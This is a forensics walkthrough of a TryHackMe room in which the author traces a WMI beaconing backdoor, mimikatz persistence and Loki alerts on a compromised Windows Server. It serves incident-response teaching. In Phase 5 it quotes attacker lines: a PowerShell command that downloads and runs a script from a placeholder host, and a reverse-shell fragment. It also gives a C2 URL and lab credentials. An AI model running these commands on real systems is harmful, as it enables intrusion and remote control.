---
layout: writeup
lang: en
permalink: /en/writeups/investigating-windows-2/
title: "Investigating Windows 2.0"
ref: investigating-windows-2
date: 2026-09-01
bare: true
platform: THM
os: Windows Server 2016 Datacenter
difficulty: Medium
series: thm-windows
tags: [win, dfir, wmi, loki, yara, procmon, sysinternals]
txt: /writeups-files/investigating-windows-2.txt
summary: "Thirty questions on a compromised machine. The attacker left a WMI backdoor that calls home every hour and that closes Process Explorer as soon as you try to open it."
---

# Writeup — Investigating Windows 2.0 (TryHackMe)

OS: Windows Server 2016 Datacenter (build 14393)
Difficulty: Medium
Date: 13 September 2026

---

## Summary

second room of the series, the same machine as the first but this time the questions are thirty and they dig much deeper. still no exploitation: RDP with Administrator / letmein123! and you analyse. the difference from room 1 is that here reading native output isn't enough any more, you need the Sysinternals and above all Loki, the IOC scanner based on Yara rules, and in the last question you have to write the strings of a Yara rule yourself to catch the binary Loki doesn't detect.

the machine is the same EC2AMAZ-I8UHO76 already seen. what emerges on top of the first room is the WMI persistence implant: two ActiveScriptEventConsumers registered in the repository, one doing beaconing towards an external C2 every hour, the other killing Process Explorer the instant you try to open it. that last one is the most elegant thing in the whole room, because it sabotages the very tool you'd be investigating with

---

## additional tools and methodology

an llm was used during the session: for looking up CVE details, interpreting raw output, suggesting unexplored vectors when stuck, detailed explanation of technical concepts and correcting syntax in long commands. the execution and the operational decisions were mine. the writeup was written by me and later cleaned up with the same tool.

for the syntax of WMI queries from the command line and for how event subscriptions work I referred to the Microsoft documentation:
https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

some hashes in Loki's output have been masked with asterisks at publication time.

---

## Preface

Kali virtualised on Linux Mint, TryHackMe VPN active and verified with ip a show tun0 (192.168.134.214/18).

unlike the previous room, this time RDP from my Kali worked, but the machine turned out to be unstable in a way that shaped the whole session: every time the load rose even slightly, the RDP session dropped. and the load rose basically always, because this room asks you to use Procmon and Loki, which are exactly the two heaviest things you can launch on a 2 GB VM.

xfreerdp /v:10.114.179.164 /u:Administrator /p:'letmein123!' /clipboard /dynamic-resolution /cert:ignore
[ERROR][com.freerdp.core] - [get_next_addrinfo]: ERRCONNECT_CONNECT_FAILED [0x00020006]
[ERROR][com.freerdp.core.transport] - ConnectLayer 10.114.179.164:3389 [15000ms] failed

this error at first made me think of the VPN, but nc -zvw3 10.114.179.164 3389 was answering open intermittently: the machine was still finishing booting and the RDP service wasn't up. the solution was a loop that retries until it latches on, instead of sitting there relaunching by hand:

until xfreerdp /v:10.114.179.164 /u:Administrator /p:'letmein123!' /clipboard /cert:ignore /bpp:8 -themes -wallpaper -aero /timeout:60000 2>/dev/null; do sleep 10; done

the /bpp:8 and the disabling of themes and wallpaper I added after the first kicks, to lighten the session as much as possible

the other recurring problem was the clipboard: rdpclip.exe on the target freezes constantly and copy-paste stops working with no warning. it's solved without reconnecting:

taskkill /f /im rdpclip.exe & start rdpclip

I had to relaunch it at least eight times over the course of the session. I write it because it's the kind of detail no writeup ever reports and that instead costs you twenty minutes if you don't know what it is.

---

## Phase 1 — The registry key that twins the scheduled task

the first question asks which registry key contains the same command executed by a scheduled task. from the previous room I already knew the malicious tasks were GameOver, falshupdate22, Clean file system, check logged in and update windows, and that GameOver ran mimikatz.

I pulled the commands of all of them in one go, instead of opening them one by one:

for %t in ("GameOver" "falshupdate22" "Clean file system" "check logged in" "update windows" "BADR" "BadrClient") do @schtasks /query /tn %t /fo list /v | findstr /i /c:"Task To Run"

Task To Run:                          C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt
Task To Run:                          powershell.exe -WindowStyle Hidden -nop -c ""
Task To Run:                          C:\TMP\nc.ps1 -l 1348
Task To Run:                          "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
Task To Run:                          "C:\Program Files (x86)\Internet Explorer\ieinstal.exe"
Task To Run:                          powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\badr\badr-ng.ps1
Task To Run:                          C:\badr\badr.exe -config C:\badr\config.yaml ...

BADR and BadrClient I discarded immediately: the lab machine is literally called "YaraChallenge -badr", so it's room infrastructure, not part of the attack. falshupdate22 runs an empty powershell command, it's a pure red herring and I confirmed it by looking at the XML:

schtasks /query /tn "falshupdate22" /xml | findstr /i "Arguments Command"
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -nop -c ""</Arguments>

what matters is GameOver, which launches mimikatz with sekurlsa::LogonPasswords. that same string has to be looked for in the registry. I had already checked the Run keys in room 1 and it wasn't there,so I went for HKCU\Environment, which is where UserInitMprLogonScript lives, an old and little-travelled persistence mechanism (it runs a script on every logon of the user):

reg query "HKCU\Environment"

HKEY_CURRENT_USER\Environment
    Path    REG_EXPAND_SZ    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
    TEMP    REG_EXPAND_SZ    %USERPROFILE%\AppData\Local\Temp
    TMP     REG_EXPAND_SZ    %USERPROFILE%\AppData\Local\Temp
    UserInitMprLogonScript    REG_MULTI_SZ    C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt

exactly the same command as the GameOver task. so mimikatz runs both at regular intervals through the scheduler and on every logon.

note: the room hint writes "UserIntMprLogonScript", with a typo (missing the i of Init). the accepted answer is UserInitMprLogonScript, and for a while I thought I had the wrong key because I was copying the hint.

---

## Phase 2 — The tool that closes by itself

the next question asks which analysis tool closes immediately when you try to launch it. in the Tools folder on the desktop there is the complete SysinternalsSuite, and the first tool anyone opens to look at processes is Process Explorer:

C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\procexp64.exe

the window appears for a fraction of a second and disappears. it isn't a crash, it's something terminating it. the room wants the name of the executable, procexp64.exe, and not the name of the tool, and the explanation of why it dies comes from the next phase.

---

## Phase 3 — The WMI implant

Loki has a WMI plugin that enumerates the registered event subscriptions, and that's where you see everything. but the same result can also be obtained with native wmic, which is faster and doesn't load the machine:

wmic /namespace:\\root\subscription path __FilterToConsumerBinding get Consumer,Filter

Consumer                                                  Filter
ActiveScriptEventConsumer.Name="LaunchBeaconingBackdoor"  __EventFilter.Name="TimingIntervalTrigger"
NTEventLogEventConsumer.Name="SCM Event Log Consumer"     __EventFilter.Name="SCM Event Log Filter"
ActiveScriptEventConsumer.Name="KillProcess"              __EventFilter.Name="ProcessStartTrigger"

three bindings. the middle one, SCM Event Log Consumer, is legitimate and present on every Windows, I discard it. the other two are the attack.

KillProcess is hooked to ProcessStartTrigger, and its WQL query is this:

SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'

that's why Process Explorer dies. there is a VBScript consumer that fires on the start event of that precise process and calls Terminate() on the just-born PID. it's the answer to two questions at once: the tool is Process Explorer and the WQL is that one.

the language of the consumers can be read directly:

wmic /namespace:\\root\subscription path ActiveScriptEventConsumer get Name,ScriptingEngine

Name                       ScriptingEngine
LaunchBeaconingBackdoor    VBScript
KillProcess                VBScript

VBScript, and the other script is LaunchBeaconingBackdoor.

that last one is the big piece. its ScriptText contains, in plain text, the whole beaconing logic: it reads the MachineGuid from the registry, appends it to the C2 URL, makes a GET, and depending on the response's Type header it executes VBScript code, saves a payload inside the WMI repository, deletes a class or launches a command via Win32_Process. the C2 is

http://googleaccountsservices.com/index.html&ID= + MachineGuid

and the timer interval is readable from the repository:

wmic /namespace:\\root\cimv2 path __IntervalTimerInstruction get TimerId,IntervalBetweenEvents

IntervalBetweenEvents  TimerId
3600000                Timer

3600000 milliseconds, that is a beacon every hour. from here also comes the WQL of the other filter, SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'.

inside the code of the base64 decoder included in the script there are the comments of the original author, which the attacker didn't clean up:

' 1999 - 2004 Antonin Foller, http://www.motobit.com
'1999 Antonin Foller, Motobit Software, http://Motobit.cz

the company is Motobit Software and the two sites are http://www.motobit.com and http://motobit.cz. it's code copied from a public base64 conversion library, reused inside a backdoor. the room exploits this for the next question: searching online for the consumer's name together with Motobit's domain gets you to WMIBackdoor.ps1, a public attack script for registering WMI persistence, which is exactly the same file that sits on the machine:

dir /s /b C:\WMIBackdoor.ps1
C:\TMP\WMIBackdoor.ps1

and indeed the script's structure matches what we see registered:

findstr /i "TimerID Interval" C:\TMP\WMIBackdoor.ps1
        [Parameter(Mandatory = $True, ParameterSetName = 'Interval')]
        $TimingInterval,
            $IntervalMS = $TimingInterval * 60000
                Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"

the $TimingInterval * 60000 confirms that the value 3600000 corresponds to 60 minutes passed as a parameter.

---

## Phase 4 — Procmon without a GUI

questions 10 to 14 want Process Monitor: which two processes open and close continuously, who the parent is, what the first operation is, what the Event tab shows, and which anomalous process appears in the disk operations.

the problem is that Procmon in GUI on this machine means a guaranteed kick within a minute. the first time it threw me out while I was still opening the Filter menu.

the solution is that Procmon has a headless mode. you launch it with /Quiet /Minimized and it writes to a backing file, and if you start it with start /b it survives the RDP disconnection:

start "" /b C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\Procmon64.exe /AcceptEula /Quiet /Minimized /BackingFile C:\cap.pml /Runtime 300

five minutes of capture running on its own. it kicked me halfway through, but the file keeps filling up on the machine side and when I got back in it was all there.

then the conversion to CSV, which is the only step that requires the GUI but doesn't require interaction:

C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\Procmon64.exe /OpenLog C:\cap.pml /SaveAs C:\cap.csv

dir C:\cap.csv
09/13/2026  03:44 PM       355,249,050 cap.csv

355 MB. at that point findstr and PowerShell do the rest without touching any graphical interface. one detail that cost me dearly: my first attempt was

findstr /i "Process Start" C:\cap.csv

which doesn't work, because findstr with multiple words in quotes searches them in OR and gives you back half the file. on 355 MB that means endless output. the right form uses the match as a single string:

powershell -c "sls 'Process Start' C:\cap.csv | %{($_ -split ',')[1]} | sort -u"

"atbroker.exe"
"Conhost.exe"
"csrss.exe"
"DllHost.exe"
"dwm.exe"
"LogonUI.exe"
"lpremove.exe"
"powershell.exe"
"rdpclip.exe"
"smss.exe"
"svchost.exe"
"taskhostw.exe"
"TSTheme.exe"
"winlogon.exe"
"wmic.exe"
"wmiprvse.exe"

here there's a trap I walked right into. in this list wmic.exe appears with four closely spaced starts, and at the time I had taken for granted that the two recurring processes were powershell.exe and wmic.exe. wrong: those wmic events were me, they were my own WMI queries from phase 3 ending up in the capture. filtering the times shows it plainly:

powershell -c "sls 'Process Start' C:\cap.csv | ?{$_ -match 'wmic|powershell'} | %{($_ -split ',')[0]+' '+($_ -split ',')[1]}"

C:\cap.csv:828364:"3:39:04.2790376 PM" "powershell.exe"
C:\cap.csv:1954386:"3:41:04.2820239 PM" "powershell.exe"
C:\cap.csv:2043585:"3:41:55.6312910 PM" "wmic.exe"
C:\cap.csv:2047881:"3:41:55.9340251 PM" "wmic.exe"
C:\cap.csv:2050971:"3:41:56.0879098 PM" "wmic.exe"
C:\cap.csv:2054659:"3:41:56.2772642 PM" "wmic.exe"

the four wmic events are all within the same second, 3:41:55-56, that is a single burst: it's my own activity, not a periodic pattern. powershell.exe on the other hand appears at 3:39:04 and at 3:41:04, exactly two minutes later, and that one is periodic. the second recurring process is mim.exe, which doesn't appear in this capture because I had restarted the machine and the first run of the GameOver task hadn't fired yet within the five-minute window. redoing the capture for longer shows both.

so the two processes are mim.exe and powershell.exe.

the full line of the first Process Start gives three answers at once:

powershell -c "sls 'Process Start' C:\cap.csv | ?{$_ -match 'powershell'} | select -f 1 -exp Line"

"3:39:04.2790376 PM","powershell.exe","4288","Process Start","","SUCCESS","Parent PID: 916, Command line: powershell.exe -WindowStyle Hidden -nop -c """", Current directory: C:\Windows\system32\, Environment:

Parent PID 916, and the four fields of the Event tab are Parent PID, Command line, Current directory, Environment. the parent's name:

wmic process where "ProcessId=916" get Name,ExecutablePath

ExecutablePath                   Name
C:\Windows\system32\svchost.exe  svchost.exe

svchost.exe, which is consistent: scheduled tasks are launched by the Task Scheduler, which runs inside an svchost.

the first operation of the process overall is Process Start, verifiable by taking the first rows of that PID:

powershell -c "sls '\"4288\"' C:\cap.csv | select -f 3 -exp Line"

"3:39:04.2790376 PM","powershell.exe","4288","Process Start","","SUCCESS","Parent PID: 916, ...
"3:39:04.2791009 PM","powershell.exe","4288","Thread Create","","SUCCESS","Thread ID: 4580"
"3:39:04.2831665 PM","powershell.exe","4288","Load Image","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","SUCCESS","Image Base: ...

Process Start, then Thread Create, then Load Image. the canonical startup sequence.

for the disk operations, looking at the Process Name column of the writes an entry appears that isn't a process: "No Process". these are disk operations with no attributable process, typically kernel-level activity or activity of a process already terminated when the event is recorded. on a compromised machine that is exactly the kind of anomaly you look for, and it's the answer to the question about the anomalous process in the disk operations.

for the count of writes per process, which helps to orient yourself:

powershell -c "sls -s 'WriteFile' C:\cap.csv | %{($_ -split ',')[1]} | sort -u"

"amazon-ssm-agent.exe"
"badr.exe"
"Explorer.EXE"
"lsass.exe"
"MpCmdRun.exe"
"MsMpEng.exe"
"powershell.exe"
"svchost.exe"
"System"
"taskhostw.exe"
"TiWorker.exe"
"TrustedInstaller.exe"

the -s (SimpleMatch) is what makes the search practicable on a file that size, without it the regex takes minutes.

---

## Phase 5 — Loki

here is the meatiest part, fourteen questions on a single output. Loki sits in Tools on the desktop, but not in the folder you'd expect:

dir /s /b C:\Users\Administrator\Desktop\Tools\loki_0.33.0\*.exe
C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki-upgrader.exe
C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe

there's a second level of "loki" folder inside "loki_0.33.0" and my first launch failed because of it.

the first scan I ran only on C:\TMP to go fast:

C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\TMP --noprocscan --dontwait -l C:\loki.log

and this was a wrong choice that cost me a full round. questions 24 to 28 concern a binary that sits in C:\Users\Public, therefore outside C:\TMP, and with that scope they don't come up. the scan has to be run on the whole disk:

C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\ --noprocscan -l C:\loki.log

the --noprocscan skips the scan of processes in memory, which on this VM is the part that kills it. even so it takes quite a while and the room's advice to let it run until you see the warnings about ntds.dit is correct.

on this step I had to restart the machine a couple of times: loki.log wouldn't open straight away and the VM ran out of RAM halfway through the scan. question 29 in particular is the one that cost me the most time of all, because to answer "which binary doesn't appear" you need certainty that the scan got to the end, otherwise you're just looking at a truncated log.

the output, starting from the beginning:

[NOTICE] Starting Loki Scan VERSION: 0.33.0 SYSTEM: EC2AMAZ-I8UHO76
[NOTICE] Registered plugin PluginWMI
[NOTICE] PE-Sieve successfully initialized
[INFO] File Name Characteristics initialized with 2973 regex patterns
[INFO] C2 server indicators initialized with 1548 elements
[INFO] Malicious MD5 Hashes initialized with 19034 hashes
...
[INFO] Initialized 682 Yara rules

the module after Init is WMI Scan, that is the WMI plugin Loki registers and then runs first. it's the PluginWMI we see loaded at the top.

the warnings arrive right after,in order:

[WARNING] CLASS: __eventFilter
MD5: ******** NAME: TimingIntervalTrigger QUERY: SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'
[WARNING] CLASS: __eventFilter
MD5: ******** NAME: ProcessStartTrigger QUERY: SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'
[WARNING] CLASS: __FilterToConsumerBinding
MD5: ******** CONSUMER: ActiveScriptEventConsumer.Name="LaunchBeaconingBackdoor" FILTER: __EventFilter.Name="TimingIntervalTrigger"
[WARNING] CLASS: __FilterToConsumerBinding
MD5: ******** CONSUMER: ActiveScriptEventConsumer.Name="KillProcess" FILTER: __EventFilter.Name="ProcessStartTrigger"

the second warning has eventFilter ProcessStartTrigger, the fourth has __FilterToConsumerBinding as its class. the questions ask for exactly these two, and you have to count the warnings in the order they come out, not the bindings.

then the alerts on the files:

[ALERT]
FILE: C:\TMP\nbtscan.exe SCORE: 160 TYPE: EXE SIZE: 36864
FIRST_BYTES: 4d5a90000300000004000000ffff0000b8000000 / MZ
MD5: ******** SHA256: ********
REASON_1: File Name IOC matched PATTERN: \\nbtscan\.exe SUBSCORE: 60 DESC: Known Bad / Dual use classics
REASON_2: Malware Hash TYPE: SHA256 SUBSCORE: 100 DESC: Emissary Panda Tools and Malware

the FIRST_BYTES 4d5a9000... are the MZ header of a PE, so in theory they hold for any executable, but the question refers to this specific alert: nbtscan.exe. the description of reason 1 is Known Bad / Dual use classics, that is a known dual-use tool, legitimate in itself but a classic in the offensive arsenal.

[ALERT]
FILE: C:\TMP\p.exe SCORE: 105 TYPE: EXE SIZE: 381816
MD5: ******** SHA256: ********
REASON_1: File Name IOC matched PATTERN: \\[a-zA-Z]\.exe$ SUBSCORE: 45 DESC: Typical Malware Name
REASON_2: Yara Rule MATCH: APT_Cloaked_PsExec SUBSCORE: 60
DESCRIPTION: Looks like a cloaked PsExec. May be APT group activity.
MATCHES: Str1: psexesvc.exe Str2: Sysinternals PsExec

p.exe is the one flagged APT Cloaked, and the two strings that triggered the rule are psexesvc.exe and Sysinternals PsExec. also worth noting is reason 1: the pattern \\[a-zA-Z]\.exe$ catches files with a single-letter name, which is a convention typical of whoever drops renamed tools to keep them short to type.

[WARNING]
FILE: C:\TMP\schtasks-backdoor.ps1 SCORE: 60 TYPE: UNKNOWN SIZE: 7022
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: PowerShell_Susp_Parameter_Combo
DESCRIPTION: Detects PowerShell invocation with suspicious parameters
MATCHES: Str1:  -enc  Str2:  -nop  Str3:  -ep bypass  Str4:  -exec bypass

[INFO] Scanning memory dump file somethingwindows.dmp

the alert associated with somethingwindows.dmp is schtasks-backdoor.ps1: Loki processes the dump and the resulting match is attributed to that script, which is also the file immediately adjacent in the output. I then opened the script to understand what it contained:

type C:\TMP\schtasks-backdoor.ps1 | findstr /i "enc bypass http"

C:\Users\test\Desktop>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method nccat -ip 8.8.8.8 -port 9999 -time 2"
powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 8.8.8.8 -port 8081 -time 2"
        ps = 'powershell.exe -ep bypass -enc ';
`$client = New-Object System.Net.Sockets.TCPClient("$Ip",$Port);`$stream = `$client.GetStream();...

it's a generator of backdoor scheduled tasks: it downloads itself from a server, and depending on the method it creates either a pure TCP reverse shell or an msf payload, with a two-minute interval. the 8.8.8.8 is obviously a placeholder from the tool's documentation, not the real C2, and the two minutes are exactly the interval I had seen in Procmon between one powershell.exe and the next. the two pieces match.

[WARNING]
FILE: C:\TMP\xCmd.exe SCORE: 60 TYPE: EXE SIZE: 843776
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: XOR_4byte_Key
DESCRIPTION: Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)

xCmd.exe is the encrypted binary similar to a trojan. 4-byte XOR is a trivial obfuscation technique but sufficient against static signatures, and the rule associates it with Derusbi.

[WARNING]
FILE: C:\TMP\mim-out.txt SCORE: 80
FIRST_BYTES: 0d0a20202e23232323232e2020206d696d696b61 /   .#####.   mimika
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: Mimikatz_Logfile
DESCRIPTION: Detects a log file generated by malicious hack tool mimikatz
MATCHES: Str1: SID               : Str2: * NTLM     : Str3: Authentication Id : Str4: wdigest :

the FIRST_BYTES here are mimikatz's ASCII banner in plain text. the output file is detected, the executable that produced it isn't, and question 29 comes back to this.

the part I hadn't seen with the scan limited to C:\TMP:

FILE: C:\Users\Public\svchost.exe SCORE: **** TYPE: EXE
MD5: ******** SHA256: ********
REASON_1: ... DESC: Stuff running where it normally shouldn't

svchost.exe is one of the core Windows processes and it lives exclusively in C:\Windows\System32. a copy in C:\Users\Public is pure masquerading: the name is so familiar that in a process list you don't even look at it. the description of reason 1 is Stuff running where it normally shouldn't, which is Loki's category for out-of-place binaries, and the legitimate path is C:\Windows\System32.

in the same folder:

FILE: C:\Users\Public\en-US.js SCORE: **** TYPE: UNKNOWN
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: CACTUSTORCH

en-US.js, disguised as a localisation file. CACTUSTORCH is a framework known for executing shellcode via JScript/VBScript by leveraging the .NET framework, and it's consistent with everything else in the implant, which is based entirely on native scripting engines instead of compiled binaries.

finally question 29, which binary doesn't appear in the results:

findstr /i "mim.exe" C:\loki.log

no output. mim.exe isn't there. and it isn't a coincidence: it's the most important file on the whole machine, it's run by a scheduled task and by a logon key, but none of the 682 Yara rules loaded intercepts it. its text output yes, it itself no

---

## Phase 6 — Writing the Yara rule

the last question is the only one where you produce something instead of reading it. in the yara-v4.0.4 folder on the desktop there's an incomplete rule:

type C:\Users\Administrator\Desktop\Tools\yara-v4.0.4-1544-win64\test.yar

rule mimikatz
{
        strings:
                $s1 = "??.??1"
                $s2 = "??.?x?"
                $s3 = "v?.?.????7"
        condition:
                all of them
}

these are three patterns with ? as the wildcard character, and the condition is all of them, so you need three real strings inside mim.exe that match those masks. the way to find them is Sysinternals' strings with findstr in regex mode, translating every ? into a dot:

C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\strings64.exe -accepteula C:\TMP\mim.exe | findstr /r "..\...1 ..\..x. v..\...\.....7"

PowerShell.ExecutionPolicy
Service.exe.manifest
PowerShell.ExecutionPolicy
3.8.0.129
mk.ps1
mk.ps1
mk.ps1
mk.exe
mk.exe
mk.exe

the first two come out straight away: mk.ps1 matches ??.??1 and mk.exe matches ??.?x?. the third doesn't, because the mask v?.?.????7 has a different structure and my first regex attempt was wrong:

strings64.exe C:\TMP\mim.exe | findstr /r "^v.\...\....7"
(no output)

the mistake was anchoring with ^ and getting the character count between the dots wrong. v?.?.????7 means: v, one character, dot, one character, dot, four characters, 7. without the anchor and with the right groups:

strings64.exe C:\TMP\mim.exe | findstr /r "v.\..\.....7"

<supportedRuntime version="v2.0.50727" />
v2.0.50727
<supportedRuntime version="v2.0.50727" />
v2.0.50727

v2.0.50727, which is the build number of the .NET Framework 2.0. so the three strings are mk.ps1, mk.exe, v2.0.50727.

the reasoning behind the rule is worth more than the answer: mk.ps1 and mk.exe are the original names of mimikatz's artefacts before the rename, left inside the binary as residual strings. the attacker renamed the file on disk but didn't touch the content, and the detection works precisely on that. the reference to .NET 2.0 adds specificity and reduces false positives.

---

## Phase 7 — The rest of the picture

I verified some things even though they weren't questions, because they were needed to close the timeline.

the credentials actually stolen:

type C:\TMP\mim-out.txt | findstr /i "Username Password NTLM"

mimikatz(powershell) # sekurlsa::logonpasswords
         * Username : Ion
         * NTLM     : ********
         * Username : Ion
         * Password : MySecretP4ass
         * Username : Administrator
         * Username : ION-PC$
         * Password : (null)

the compromised user is Ion on a host ION-PC, with a cleartext password recovered from wdigest. this host isn't the machine I'm analysing, so the dump was brought here from another system, as was already the case with the pwdump on the desktop in room 1.

the hosts file, still poisoned:

type C:\Windows\System32\drivers\etc\hosts

10.2.2.2        update.microsoft.com
127.0.0.1  www.virustotal.com
127.0.0.1  www.www.com
127.0.0.1  dci.sophosupd.com
76.32.97.132 google.com
76.32.97.132 www.google.com

and the Run keys:

reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

UpdateSvc    REG_SZ    C:\TMP\p.exe -s \\10.34.2.3 'net user' > C:\TMP\o2.txt
BadrClient   REG_SZ    wscript.exe "C:\badr\start-badr.vbs" //B //Nologo

the custom firewall rules this time were gone:

netsh advfirewall firewall show rule name=all | findstr /i "1348"
(no output)

the 1337 and 8888 from the previous room don't show up on this instance. it could be a difference between the snapshots of the two rooms or a reset, either way I noted it as an absent artefact and didn't use it for the timeline.

---

## Full chain

reconstructed timeline, times in UTC of 2 March 2019 where available.

16:04:49  initial access and assignment of elevated privileges (from room 1, entry through the .jsp webshell in C:\inetpub\wwwroot)
16:37     toolkit dropped in C:\TMP: mim.exe, p.exe, xCmd.exe, nc.ps1, nbtscan.exe, WMIBackdoor.ps1
16:37     mimikatz executed, credentials of the user Ion (host ION-PC) written into mim-out.txt
16:45     memory dump somethingwindows.dmp, generation of schtasks-backdoor.ps1
16:46     NetBIOS reconnaissance with nbtscan, scan1/2/3.tmp return zero bytes
16:47     registration of the malicious scheduled tasks
--        drop of C:\Users\Public\svchost.exe (masquerading on a core process) and of en-US.js (CACTUSTORCH loader)
--        registration of the two WMI event subscriptions through WMIBackdoor.ps1:
             TimingIntervalTrigger -> LaunchBeaconingBackdoor, VBScript beacon every 3600000 ms
             towards http://googleaccountsservices.com/index.html&ID=<MachineGuid>
             ProcessStartTrigger -> KillProcess, terminates procexp64.exe on start
--        HKCU\Environment\UserInitMprLogonScript set to mim.exe, mimikatz on every logon
--        task GameOver: mim.exe sekurlsa::LogonPasswords, the same command as the key
--        task Clean file system: nc.ps1 -l 1348, daily bind shell
--        task falshupdate22: empty powershell, a decoy
--        Run keys: p.exe towards 10.34.2.3 (internal lateral movement), start-badr.vbs silent
--        hosts poisoned: update.microsoft.com, virustotal and sophosupd neutralised, google.com on 76.32.97.132

the logic of the implant is redundancy across different planes. the persistence sits simultaneously in the Task Scheduler, in the user registry, in the Run keys and in the WMI repository, which are four places you check with four different tools. the beaconing uses VBScript inside WMI, which leaves no file on disk. and the KillProcess consumer is active defence: it doesn't hide the traces, it stops you from opening the very tool you'd see them with.

---

## Room answers

1.  UserInitMprLogonScript
2.  Process Explorer
3.  SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'
4.  VBScript
5.  LaunchBeaconingBackdoor
6.  Motobit Software
7.  http://www.motobit.com, http://motobit.cz
8.  WMIBackdoor.ps1
9.  C:\TMP
10. mim.exe, powershell.exe
11. svchost.exe
12. Process Start
13. Parent PID, Command line, Current directory, Environment
14. No Process
15. WMI Scan
16. ProcessStartTrigger
17. __FilterToConsumerBinding
18. nbtscan.exe
19. Known Bad / Dual use classics
20. p.exe
21. psexesvc.exe, Sysinternals PsExec
22. schtasks-backdoor.ps1
23. xCmd.exe
24. C:\Users\Public\svchost.exe
25. C:\Windows\System32
26. Stuff running where it normally shouldn't
27. en-US.js
28. CACTUSTORCH
29. mim.exe
30. mk.ps1, mk.exe, v2.0.50727

---

## Lessons learned

the main lesson is about tool scope. I launched Loki on C:\TMP because the toolkit was there and it seemed efficient, and I lost a whole round: five questions out of thirty concerned C:\Users\Public, which wasn't in scope. in a forensic job, narrowing the scope to go fast is exactly the way to be slow, because you don't know what you're excluding until you find out you needed it.

the second concerns attribution of what you see. the four wmic.exe events in the Procmon capture were my activity, not the attacker's, and for a moment I had taken them as the answer. on a system you're analysing live, your own work generates artefacts that end up in the capture, and telling them apart requires looking at the timestamps and asking yourself what you were doing at that moment. the same problem as room 1 with the rotated logs, in another form: the analyst contaminates the scene.

the third is practical and concerns the instability. when the machine can't handle a GUI, almost all the Sysinternals tools have a documented headless mode that nobody uses. Procmon with /Quiet /Minimized /BackingFile /Runtime does exactly the same job, writes to a file, survives the RDP disconnection, and then you query the file with findstr and PowerShell without ever opening a window. it saved my session, and I got there only after the fourth kick.

on the technical side, the thing I take away is the WMI implant. I had never seen an event subscription used both for persistence and for active defence against the analyst, and the fact that an ActiveScriptEventConsumer is simply a VBScript string inside the repository, with no file on disk, explains why it's such a long-lived technique. to find it you have to know it exists and you have to query root\subscription, there's no obvious place where it jumps out at you

---

## Tools used

xfreerdp, RDP, Loki 0.33.0, Yara 4.0.4, Sysinternals Suite (Procmon64, Process Explorer, strings64, handle64), Process Hacker 2, schtasks, reg query, wmic, findstr, type, dir, PowerShell (Select-String), netsh advfirewall
